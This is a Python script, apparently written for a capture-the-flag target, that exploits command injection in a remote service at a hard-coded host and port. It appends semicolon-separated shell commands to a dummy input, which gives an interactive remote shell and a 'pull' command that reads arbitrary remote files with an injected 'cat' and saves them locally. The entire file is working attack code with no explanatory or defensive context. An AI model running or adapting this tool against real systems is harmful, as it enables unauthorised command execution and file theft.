""" PLEASE NOTE: use a small delay between instructions otherwise it will not load the output"""
import socket
import os
from requests import get
host = "1337bank.money" # IP address here
port = 1337 # Port here
dir = "/"


if __name__ == '__main__':
    running = True
    while running:
        print("> ",end = '')
        first = input()       
        if first == "shell":        
            while running:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, port))
                print(dir, end='')
                print("> ",end = '')
                cmd = input()  
                msg = "asd; cd " + dir + "; " + cmd + "\n"
                s.send(msg.encode('utf-8'))
                
                if cmd == "quit":
                    break   
                if cmd == "cd":
                    dir = "/"
                elif "cd" in cmd:
                    dir = cmd[3:]
                else:
                    data = s.recv(1024) 
                    data = s.recv(1024)
                    data = s.recv(1024)
                    for x in data.decode('utf-8').split("\\"):
                        print(x)

        elif first == "help":
            print ("1. shell: Drop into an interactive shell and allow users to gracefully exit")
            print ("2. pull <remote-path> <local-path>: Download files")
            print ("3. help: Shows this help menu")
            print ("4. quit: Quit the shell")
        elif "pull" in first:
                split = first.split(" ")
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, port)) 
                msg = "asd; " + "cat " + split[1] + "\n"           
                s.send(msg.encode('utf-8'))
                data = s.recv(1024) 
                data = s.recv(556)
                data = s.recv(10024)
                result = data.decode('utf-8')
                filedir = split[1].split("/")
                
                if len(result) > 0:
                    f = open(split[2] + "/" + filedir[len(filedir)-1], "w+")
                    f.write(result)
                    f.close()
                    
                
        elif first == "exit":
            running = False
            break

                
